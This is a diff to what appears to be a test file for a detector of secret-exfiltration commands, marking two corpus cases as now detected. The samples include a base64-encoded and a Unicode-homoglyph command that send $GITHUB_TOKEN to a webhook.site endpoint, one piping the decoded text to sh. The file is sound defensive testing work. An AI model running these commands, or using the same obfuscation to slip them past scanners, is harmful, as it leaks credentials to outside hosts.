@@ -27,7 +27,7 @@ const corpus: CorpusCase[] = [
   },
   {
     id: 'base64-encoded-payload',
-    expected: 'miss',
+    expected: 'hit',
     content: 'echo Y3VybCBodHRwczovL3dlYmhvb2suc2l0ZS9hYmMgLWQgIiRHSVRIVUJfVE9LRU4i | base64 -d | sh\n',
   },
   {
@@ -38,7 +38,7 @@ const corpus: CorpusCase[] = [
   },
   {
     id: 'unicode-homoglyph-command-and-endpoint',
-    expected: 'miss',
+    expected: 'hit',
     content: 'сurl https://webhook．site/abc -d "$GITHUB_TOKEN"\n',
   },
   {
@@ -65,11 +65,11 @@ describe('A5 audit recall corpus', () => {
       'plain-token-curl',
       'same-line-sensitive-file-exfil',
       'credential-phishing-lure',
+      'base64-encoded-payload',
+      'unicode-homoglyph-command-and-endpoint',
     ]);
     expect(results.filter((r) => r.actual === 'miss').map((r) => r.id)).toEqual([
-      'base64-encoded-payload',
       'javascript-string-concat-endpoint',
-      'unicode-homoglyph-command-and-endpoint',
       'cross-line-token-and-endpoint-split',
     ]);
     expect(results.every((r) => r.actual === r.expected)).toBe(true);
